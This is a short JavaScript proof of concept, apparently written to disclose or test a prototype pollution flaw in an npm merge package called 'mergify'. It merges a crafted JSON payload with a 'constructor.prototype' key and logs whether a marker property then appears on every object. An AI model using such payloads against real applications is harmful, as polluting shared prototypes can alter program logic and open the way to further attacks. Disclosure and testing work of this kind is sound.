var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mergify = require('mergify');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
mergify(obj, JSON.parse(payload));
console.log({}.polluted);